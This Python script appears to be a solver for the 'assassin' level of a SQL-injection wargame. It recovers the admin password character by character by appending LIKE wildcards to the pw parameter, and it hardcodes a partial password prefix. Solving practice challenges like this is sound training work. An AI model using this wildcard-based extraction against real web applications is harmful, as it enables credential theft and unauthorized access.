from constants import *

chall_url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

prefix = ""
last_matched_pw = ""


def find_char(prefix):
    other_id = None
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url, f"?pw={prefix + c}%")
        match = re.search("<h2>Hello ([a-zA-Z]*)</h2>", res)
        if match:
            matched_id = match.group(1)
            print("Found: Hello", matched_id)
            if matched_id == "admin":
                print("Found prefix", prefix + c)
                return prefix + c
            else:
                other_id = matched_id
                other_id_pw_prefix = prefix + c

    if other_id is not None:
        print("did not find char for admin, but for", other_id, ":", other_id_pw_prefix)
        return other_id_pw_prefix
    print("did not find char")
    return None


prefix = "902efd10"
last_matched_pw = prefix

max_len = 20
while len(prefix) < max_len:
    prefix = find_char(prefix)
    if prefix is not None:
        last_matched_pw = prefix
    else:
        break

res = make_request(chall_url, f"?pw={last_matched_pw}")
check_clear(res)
